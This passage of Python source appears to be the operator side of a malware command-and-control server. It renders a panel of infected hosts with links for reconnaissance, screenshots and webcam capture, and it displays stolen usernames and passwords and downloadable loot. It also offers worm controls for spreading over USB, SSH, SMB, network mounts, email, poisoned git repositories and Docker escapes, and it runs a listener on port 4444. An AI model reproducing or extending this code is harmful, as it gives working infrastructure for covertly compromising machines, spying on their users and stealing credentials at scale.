        SPREAD_CMDS={"USB_SPREAD","SSH_KEY_SPREAD","SSH_SCAN_SPREAD","SSH_SPRAY_SPREAD",
                     "SMB_SPREAD","SMB_SPREAD_AUTH","NETMOUNT_SPREAD","NETMOUNT_AUTO",
                     "EMAIL_SPREAD","EMAIL_SPREAD_AUTO","GIT_POISON","DOCKER_ESCAPE",
                     "DOCKER_AUTO","WORM_STATUS","WORM_PAUSE","WORM_RESUME",
                     "WORM_STOP_SPREAD","WORM_START_SPREAD","WORM_SPREAD_NOW"}
        sorted_aids=sorted(agents.keys(),key=lambda k:(0 if "js" not in agents[k].get("type","") else 1,k))
        rows=opts=""; first=sorted_aids[0] if sorted_aids else ""
        # Identify worm agents (IDs start with 'w') vs regular agents
        worm_aids=[a for a in sorted_aids if a.startswith("w")]
        first_worm=worm_aids[0] if worm_aids else (sorted_aids[0] if sorted_aids else "")
        for aid in sorted_aids:
            a=agents[aid]
            st=a.get("status","ONLINE"); t=a.get("type","tcp"); prv=a.get("priv","?")
            is_worm=aid.startswith("w")
            dot="js" if "js" in t else ("on" if st=="ONLINE" else "off")
            ptag=f"<span class='tag root'>{prv}</span>" if prv in("ROOT","ADMIN") else f"<span class='tag user'>{prv}</span>"
            ttag=f"<span class='tag js'>{t}</span>" if "js" in t else (f"<span class='tag' style='color:#f0a;border-color:#f0a'>worm</span>" if is_worm else f"<span class='tag http'>{t}</span>")
            stag=f"<span class='tag on'>{st}</span>" if st=="ONLINE" else f"<span class='tag off'>{st}</span>"
            so=a["os"][:60]+"…" if len(a["os"])>60 else a["os"]
            rows+=(f"<tr data-aid='{aid}'>"
                   f"<td><b style='color:{'#f0a' if is_worm else 'var(--b)'}'>{aid}</b></td>"
                   f"<td>{a['ip']}</td>"
                   f"<td title='{a['os']}' style='max-width:280px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap'>{so}</td>"
                   f"<td>{a['hostname']} / <span style='color:var(--y)'>{a.get('user','?')}</span></td>"
                   f"<td>{ptag}</td>"
                   f"<td><span class='dot {dot}'></span>{ttag}</td>"
                   f"<td>{stag}</td>"
                   f"<td style='color:var(--dim)'>{a['last_seen']}</td>"
                   f"<td class='act'><a href='/logs?aid={aid}'>log</a>"
                   f"<a href='/q?aid={aid}&cmd=RECON'>recon</a>"
                   f"<a href='/q?aid={aid}&cmd=SCREENSHOT'>shot</a>"
                   f"<a href='/q?aid={aid}&cmd=WEBCAM'>cam</a></td></tr>")
            opts+=f"<option value='{aid}'>{aid} ({prv}) {a['ip']} {t}</option>"
        opts+="<option value='__ALL__'>★ ALL AGENTS (broadcast)</option>"
        # Worm selector (only worm agents for worm control tab)
        worm_opts=""
        for aid in worm_aids:
            a=agents[aid]; st=a.get("status","?")
            worm_opts+=f"<option value='{aid}'>{aid} {a['ip']} {a['hostname']} [{st}]</option>"
        if not worm_opts: worm_opts="<option value=''>-- no worm agents online --</option>"
        worm_opts+="<option value='__ALL_WORMS__'>★ ALL WORMS</option>"
        if not rows: rows="<tr><td colspan='9' style='color:var(--dim);text-align:center;padding:30px'>No agents connected — waiting...</td></tr>"
        # Credentials
        cr=""
        try:
            for line in reversed(open(CREDS_FILE).readlines()[-20:]):
                parts={}
                [parts.__setitem__(*(tok.split("=",1))) for tok in line.strip().split("  ") if "=" in tok]
                u=parts.get("user","?").strip("'"); p=parts.get("pass","?").strip("'"); s=parts.get("src","?")
                cr+=(f"<div class='cred'>"
                     f"<span style='color:var(--dim);font-size:10px'>user</span> <span class='u'>{u}</span>"
                     f"&nbsp;&nbsp;<span style='color:var(--dim);font-size:10px'>pass</span> <span class='p'>{p}</span>"
                     f"&nbsp;&nbsp;<span class='src'>{s}</span></div>")
        except: pass
        if not cr: cr="<p style='color:var(--dim);padding:20px 0'>No credentials captured yet.</p>"
        # Output
        ou=""
        for aid,rs in list(agent_resps.items()):
            for r in rs[-5:]:
                loot_html=""
                if r.get("type")=="image" and r.get("loot"):
                    lf=r['loot']; loot_html=f"<img src='/loot/dl/{lf}' class='eimg' loading='lazy'>"
                ou+=(f"<div class='entry'><div class='ehdr'>"
                     f"<span class='eaid'>[{aid}]</span>"
                     f"<span class='ecmd'>{r['cmd'][:80]}</span>"
                     f"<span class='etime'>{r['ts']}</span></div>"
                     f"<div class='eout'>{r['resp'][:4000]}</div>{loot_html}</div>")
        if not ou: ou="<div style='color:var(--dim);padding:20px;text-align:center'>No output yet — send a command to an agent.</div>"
        # Loot gallery
        lg=""
        if os.path.isdir(LOOT_DIR):
            files=sorted(os.listdir(LOOT_DIR),reverse=True)[:24]
            for f in files:
                fp=os.path.join(LOOT_DIR,f); sz=os.path.getsize(fp)
                if f.lower().endswith((".png",".jpg",".jpeg")):
                    lg+=(f"<div class='loot-card'><img src='/loot/dl/{f}' loading='lazy'>"
                         f"<div class='li'><div class='lf'>{f}</div>"
                         f"<div class='ls'>{sz//1024} KB</div>"
                         f"<a class='la' href='/loot/dl/{f}' download>&#x2B07; download</a></div></div>")
                else:
                    lg+=(f"<div class='loot-card'>"
                         f"<div style='padding:30px;text-align:center;color:var(--dim);font-size:28px'>&#x1F4C4;</div>"
                         f"<div class='li'><div class='lf'>{f}</div>"
                         f"<div class='ls'>{sz//1024} KB</div>"
                         f"<a class='la' href='/loot/dl/{f}' download>&#x2B07; download</a></div></div>")
        if not lg: lg="<div style='color:var(--dim);padding:20px'>No loot yet.</div>"
        # Worm family cards
        wf=""
        for aid in worm_aids:
            a=agents[aid]; st=a.get("status","ONLINE")
            # Collect recent spread events for this worm
            recent=[]
            for r in list(agent_resps.get(aid,[])):
                if any(r['cmd'].startswith(x) for x in ["USB_SPREAD","SSH_","SMB_","NET","EMAIL","GIT","DOCKER","WORM_","AUTO_EXFIL"]):
                    recent.append(r)
            recent=recent[-8:]
            sc=f"<span style='color:var(--g)'>ONLINE</span>" if st=="ONLINE" else f"<span style='color:var(--r)'>OFFLINE</span>"
            feed=""
            for r in reversed(recent):
                cmd=r['cmd']; resp=r['resp'][:120].replace('<','&lt;'); t_=r['ts']
                col="var(--g)" if "SPREAD" in cmd or "AUTO" in cmd else "var(--b)"
                feed+=f"<div style='padding:3px 0;border-bottom:1px solid #111;display:flex;gap:8px'><span style='color:{col};min-width:140px'>{cmd}</span><span style='color:var(--dim);font-size:10px'>{t_}</span><span style='color:#888;font-size:10px'>{resp}</span></div>"
            if not feed: feed="<div style='color:var(--dim);font-size:10px;padding:6px 0'>No spread activity yet</div>"
            wf+=(f"<div style='background:var(--bg2);border:1px solid rgba(255,0,170,.2);border-radius:5px;padding:14px;margin-bottom:12px'>"
                 f"<div style='display:flex;align-items:center;gap:12px;margin-bottom:10px;flex-wrap:wrap'>"
                 f"<span style='color:#f0a;font-weight:bold;font-size:13px'>&#x1F9A0; {aid}</span>"
                 f"<span style='color:var(--dim)'>{a['ip']}</span>"
                 f"<span style='color:var(--dim)'>{a['hostname']}</span>"
                 f"<span style='color:var(--y)'>{a.get('user','?')}</span>"
                 f"<span style='color:var(--dim);font-size:10px'>{a['os'][:50]}</span>"
                 f"<span style='margin-left:auto'>{sc}</span>"
                 f"<span style='color:var(--dim);font-size:10px'>{a['last_seen']}</span>"
                 f"<a href='/q?aid={aid}&cmd=WORM_STATUS' style='font-size:10px;color:var(--g)'>STATUS</a>"
                 f"<a href='/q?aid={aid}&cmd=WORM_SPREAD_NOW' style='font-size:10px;color:var(--b)'>SPREAD NOW</a>"
                 f"<a href='/q?aid={aid}&cmd=WORM_PAUSE' style='font-size:10px;color:var(--y)'>PAUSE</a>"
                 f"<a href='/q?aid={aid}&cmd=WORM_STOP_SPREAD' style='font-size:10px;color:var(--r)'>STOP</a>"
                 f"</div>"
                 f"<div style='font-size:10px;color:var(--dim);margin-bottom:6px;letter-spacing:1px'>RECENT ACTIVITY</div>"
                 f"{feed}</div>")
        worm_count=len(worm_aids)
        worm_online=len([a for a in worm_aids if agents[a].get("status")=="ONLINE"])
        if not wf: wf="<div style='color:var(--dim);padding:30px;text-align:center'>No worm agents connected.<br><br>Deploy <b style='color:var(--g)'>worm_agent.py</b> on a target — worm IDs start with <b style='color:#f0a'>w</b></div>"
        cc=sum(1 for _ in open(CREDS_FILE)) if os.path.exists(CREDS_FILE) else 0
        lc=len(os.listdir(LOOT_DIR)) if os.path.isdir(LOOT_DIR) else 0
        return HTML_PANEL.format(ac=len([a for a in agents.values() if a.get("status")=="ONLINE"]),
            wc=worm_count,wo=worm_online,
            cc=cc,lc=lc,ts=ts(),ar=rows,ao=opts,fa=first,fw=first_worm,
            worm_opts=worm_opts,cr=cr,ou=ou,lg=lg,wf=wf)

    def _send(self,body,ct="text/plain",raw=False):
        data=body if raw else (body.encode() if isinstance(body,str) else body)
        self.send_response(200); self.send_header("Content-Type",ct)
        self.send_header("Content-Length",len(data)); self._cors(); self.end_headers()
        self.wfile.write(data)
    def _html(self,body):
        data=body.encode() if isinstance(body,str) else body
        self.send_response(200); self.send_header("Content-Type","text/html; charset=utf-8")
        self.send_header("Content-Length",len(data)); self.end_headers()
        self.wfile.write(data)
    def _redir(self,path="/panel"):
        self.send_response(302); self.send_header("Location",path); self.end_headers()

if __name__=="__main__":
    threading.Thread(target=agent_listener,daemon=True).start()
    log(f"[*] Panel  → http://0.0.0.0:{C2_PORT}/panel")
    log(f"[*] TCP :4444 | Loot → {LOOT_DIR}")
    log(f"[*] Portal → http://0.0.0.0:{C2_PORT}/banner")
    HTTPServer(("0.0.0.0",C2_PORT),H).serve_forever()
